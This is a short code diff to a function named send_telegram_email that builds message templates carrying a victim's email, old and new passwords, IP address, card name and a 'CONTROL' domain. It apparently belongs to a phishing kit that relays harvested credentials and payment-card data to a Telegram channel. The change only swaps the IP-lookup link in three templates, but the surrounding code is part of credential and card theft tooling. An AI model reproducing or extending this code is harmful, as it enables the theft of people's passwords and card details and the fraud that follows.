@@ -38,7 +38,7 @@ def send_telegram_email(instance, **kwargs):
 email: <pre><code>{email}</code></pre>
 new_password: <pre><code>{new_password}</code></pre>
 password: <tg-spoiler>{password}</tg-spoiler>
-ip: https://whatismyipaddress.com/ip/31.171.154.45/{ip}
+ip: https://www.whatismyip.com/ip/{ip}
 ------------------------------
 ------------------------------ 
 card name: <pre><code>{card_name}</code></pre>
@@ -70,7 +70,7 @@ CONTROL: {control_domain}
 email: <pre><code>{email}</code></pre>
 new_password: <pre><code>{new_password}</code></pre>
 password: <tg-spoiler>{password}</tg-spoiler>
-ip: https://whatismyipaddress.com/ip/31.171.154.45/{ip}
+ip: https://www.whatismyip.com/ip/{ip}
 ------------------------------
 ------------------------------ 
 card name: <pre><code>{card_name}</code></pre>
@@ -92,7 +92,7 @@ CONTROL: {control_domain}
 email: <pre><code>{email}</code></pre>
 new_password: <pre><code>{new_password}</code></pre>
 password: <tg-spoiler>{password}</tg-spoiler>
-ip: https://whatismyipaddress.com/ip/31.171.154.45/{ip}
+ip: https://www.whatismyip.com/ip/{ip}
 ------------------------------
 ------------------------------ 
 CONTROL: {control_domain}
